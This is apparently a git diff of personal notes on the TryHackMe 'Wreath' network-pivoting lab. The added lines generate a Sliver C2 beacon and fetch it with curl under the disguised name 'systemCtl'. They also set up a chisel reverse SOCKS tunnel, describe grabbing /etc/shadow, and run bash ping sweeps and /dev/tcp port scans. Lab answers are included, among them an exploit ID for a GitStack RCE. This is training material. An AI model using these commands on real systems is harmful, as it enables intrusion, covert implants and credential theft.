@@ -15,9 +15,17 @@ Learnt:
 - Making python virtual environments is just that easy
 - Thomas Wreath is as haunting as Alh4zr3d described.
 - Serious ShadowIT-Defined-Routes wins!
+- Exploit with DOS line endings?
+```bash
+dos2unix $file
+`sed -i 's/\r//'`
+```
+
 Beyond Root:
 - Do the report like a professional
 - Prep reporting for further Offsec certs 2023!
+- Better  proxychains portscanning or more stealthier / elegant ways  to postscan internal networks. 
+
 
 - [[Wreath-Notes.md]]
 - [[Wreath-CMD-by-CMDs.md]]
@@ -291,13 +299,104 @@ You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward
 -x 172.16.0.100
 ```
 
+## On to the Git Server
+I decided to prep my  Sliver and pivoting with chisel
+```bash
+generate beacon --http 10.50.85.217:2222 --arch amd64 --os linux --save /home/kali/Wreath/
+http -L 10.50.85.217 -l 2222
 
+curl http://10.50.85.217/chisel -o chisel
+curl http://10.50.85.217/SILVER -o systemCtl
+
+
+sudo ./chisel server -hosts 10.50.85.217 --reverse -socks 10000
+nohup ./chisel client 10.50.85.217:10000 R:10001:socks &
+# modify /etc/proxychains4.conf socks5 127.0.0.1 10001
+```
+
+While doing the internal network recon I downloaded the /etc/shadow file with `silver`, but none of the hashes cracked with `rockyou.txt`
+![](usefulshadowcapturing.png)
+
+Instead of dropping `nmap` on the system we could also be more elegant
+```bash
+cat /proc/net/arp
+arp -a 
+
+
+# If we knew this was a containerised network - kubernetes or docker or just linux then:
+for i in $(seq 1 254); do (ping -c 1 10.200.84.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
+
+# Port scanning with bash to find open ports on .100,.150 hosts
+for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/10.200.84.100/$port && echo "open - $port") 2> /dev/null; done
+
+for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/10.200.84.150/$port && echo "open - $port") 2> /dev/null; done
+
+# Adapted
+for port in $(seq 1 15000); do (echo Hello > /dev/tcp/10.200.84.150/$port && echo "open - $port") 2> /dev/null; done
+```
+
+Finding the weird port - I did actual then have to drop `nmap` and Beyond Root is now updated to tackle this issue.
+
+Because the big *clue* of either spending a long time proxychaining nmap through chisel to find machines on this subnet we could just check IPv4 resolution on the network:
+![](arpaonprodserv.png)
+
+The only machines that have MAC addresses are the Gateway, VPN Server and .100,.150 machines
 
 #### Task 17 Git Server Enumeration
 
+Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?  
+```
+2
+```
+
+In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
+```
+100,150
+```
+
+
+Scan the hosts -- which one does _not_ return a status of "filtered" for every port (submit the last octet only)?  
+```
+150
+```
+
+Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?  
+```
+
+```
+
+Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
+```
+http
+```
+
 #### Task 18 Git Server Pivoting
 
+What is the name of the program running the service?
+```
+gitstack
+```
+
+Do these default credentials work (Aye/Nay)?
+```
+Nay
+```
+
+There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
+```
+43777
+```
+
 #### Task 19 Git Server Code Review
+
+![](gitstacksearchsploit.png)
+
+Exploit with DOS line endings?
+```bash
+dos2unix $file
+`sed -i 's/\r//'`
+```
+
 
 #### Task 20 Git Server Exploitation
 
